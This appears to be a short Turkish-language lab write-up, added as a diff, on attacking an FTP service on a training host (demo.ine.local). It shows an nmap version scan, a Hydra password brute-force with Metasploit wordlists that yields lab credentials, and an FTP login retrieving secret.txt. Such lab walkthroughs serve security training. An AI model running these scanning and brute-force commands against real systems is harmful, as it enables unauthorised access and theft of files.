@@ -1,0 +1,30 @@
+ProFTP Recon: Basics
+🔍 1. Servis Tespiti
+nmap -sV demo.ine.local
+Çıktı:
+21/tcp open  ftp     ProFTPD 1.3.5a
+Hedefte FTP servisi çalışıyor. Zayıf parola denemesi yapılabilir.
+
+🔑 2. Hydra ile FTP Brute-Force
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
+      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
+      demo.ine.local -t 4 ftp
+Sonuç:
+auditor:chocolate
+📂 3. FTP ile Bağlantı Kurma ve Dosya Alma
+
+ftp demo.ine.local
+# kullanıcı: auditor
+# şifre: chocolate
+get secret.txt
+cat secret.txt
+
+📁 Özet
+Servis: FTP (ProFTPD 1.3.5a)
+
+Brute-force: Hydra ile başarılı giriş denemesi
+
+Erişilen kullanıcı: auditor
+
+Dosya sızıntısı: secret.txt
